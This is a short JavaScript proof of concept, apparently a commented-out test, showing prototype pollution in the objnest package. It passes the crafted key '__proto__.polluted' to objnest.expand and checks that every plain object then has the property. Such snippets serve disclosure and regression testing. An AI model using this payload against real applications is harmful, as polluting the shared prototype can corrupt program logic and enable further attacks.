// //https://github.com/okunishinishi/node-objnest/pull/6
// test("prototype pollution in objnest", () => {
  const objnest = require("objnest");

  let obj = {};
console.log({}.polluted);

  objnest.expand({ "__proto__.polluted": "yes" });
console.log({}.polluted);
// });
